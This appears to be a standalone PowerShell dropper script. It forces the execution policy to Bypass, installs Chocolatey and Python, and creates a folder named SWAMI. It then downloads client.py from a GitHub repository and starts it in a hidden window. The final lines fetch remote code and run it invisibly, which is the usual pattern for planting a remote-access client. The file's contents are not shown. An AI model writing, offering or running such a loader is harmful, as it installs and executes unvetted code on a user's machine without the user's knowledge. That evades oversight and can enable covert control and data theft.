# Check the current execution policy
$currentPolicy = Get-ExecutionPolicy

if ($currentPolicy -eq 'Restricted') {
    Write-Output "Execution policy is Restricted. Setting to AllSigned..."
    try {
        Set-ExecutionPolicy -ExecutionPolicy AllSigned -Scope CurrentUser -Force
    }
    catch {
        Write-Warning "Failed to set policy to AllSigned, setting to Bypass for process scope."
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
    }
} else {
    Write-Output "Execution policy is $currentPolicy. No need to change."
}

# Run the Chocolatey install script with Bypass for the process scope
Set-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

choco install -y python3

python --version

mkdir SWAMI

cd SWAMI

iwr "https://raw.githubusercontent.com/ArcticHonour/client/refs/heads/main/client.py" -UseBasicParsing -OutFile client.py

Start-Process python.exe -ArgumentList "client.py" -WindowStyle Hidden 
